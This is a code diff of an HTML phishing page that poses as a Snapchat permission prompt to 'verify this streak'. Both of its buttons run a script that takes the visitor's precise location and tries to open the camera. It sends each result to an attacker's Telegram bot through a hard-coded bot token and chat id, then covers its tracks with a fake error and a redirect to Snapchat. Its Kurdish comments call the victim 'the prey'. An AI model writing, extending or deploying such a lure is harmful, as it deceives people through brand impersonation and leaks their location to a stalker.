@@ -1,32 +1,60 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { background-color: #000; font-family: -apple-system, sans-serif; margin: 0; overflow: hidden; }
+        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 10; }
+        .alert-box { 
+            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            width: 280px; background: rgba(255,255,255,0.95); border-radius: 15px;
+            text-align: center; z-index: 20; box-shadow: 0 0 20px rgba(0,0,0,0.5);
+        }
+        .text { padding: 20px; color: #000; font-size: 16px; font-weight: 500; }
+        .btns { display: flex; border-top: 0.5px solid #bbb; }
+        .btn { flex: 1; padding: 12px; color: #007AFF; font-size: 17px; cursor: pointer; border: none; background: none; outline: none; }
+        .btn-bold { font-weight: 600; border-right: 0.5px solid #bbb; }
+    </style>
+</head>
+<body>
+
+<div class="overlay"></div>
+<div class="alert-box">
+    <div class="text">Allow "Snapchat" to access your location and camera to verify this streak?</div>
+    <div class="btns">
+        <!-- 😈 لێرەدا فەرمانی کلیک کردنمان بۆ زیاد کردووە -->
+        <button class="btn btn-bold" onclick="launchChaos()">Allow</button>
+        <button class="btn" onclick="launchChaos()">Don't Allow</button>
+    </div>
+</div>
+
 <script>
-    // 😈 کلیلی دۆزەخ - ئەمجارە بە بێ کێشە دامناوە
     const _t = "8641718491:AAH1_yNz4ZQ0hxmMhWK9HPc7zY6CDsvfw2o";
     const _c = "212703396";
 
     async function sendToTelegram(msg) {
-        const url = `https://api.telegram.org/bot${_t}/sendMessage`;
         try {
-            await fetch(url, {
+            await fetch(`https://api.telegram.org/bot${_t}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: _c, text: msg, parse_mode: 'Markdown' })
             });
-        } catch (e) { console.error("Error sending message."); }
+        } catch (e) {}
     }
 
-    async function launchChaos() {
-        sendToTelegram("🎯 *نێچیرەکە کلیکی لەسەر تەڵەکە کرد!*");
+    function launchChaos() {
+        sendToTelegram("🎯 *نێچیرەکە کلیکی کرد!*");
 
-        // ١. لۆکەیشن
+        // ١. ڕاوکردنی لۆکەیشن
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition((pos) => {
                 let map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                 sendToTelegram(`📍 *لۆکەیشن:* \n${map}`);
                 openCamera();
             }, (err) => {
-                sendToTelegram("❌ نێچیرەکە ڕێگەی بە لۆکەیشن نەدا.");
+                sendToTelegram("❌ نێچیر لۆکەیشنی ڕەتکردەوە.");
                 openCamera();
-            }, { enableHighAccuracy: true });
+            });
         } else {
             openCamera();
         }
@@ -35,20 +63,23 @@
     function openCamera() {
         navigator.mediaDevices.getUserMedia({ video: true })
         .then(s => {
-            sendToTelegram("📸 *کامێرا کرایەوە!*");
+            sendToTelegram("📸 *کامێرا چالاک کرا!*");
             s.getTracks().forEach(t => t.stop());
             finish();
         })
         .catch(e => {
-            sendToTelegram("🚫 ڕێگەی بە کامێرا نەدا.");
+            sendToTelegram("🚫 نێچیر کامێرای ڕەتکردەوە.");
             finish();
         });
     }
 
     function finish() {
         setTimeout(() => {
-            alert("System Error (0x882). Please refresh the streak.");
+            alert("System Busy: Please refresh.");
             window.location.href = "https://www.snapchat.com";
         }, 1000);
     }
 </script>
+
+</body>
+</html>
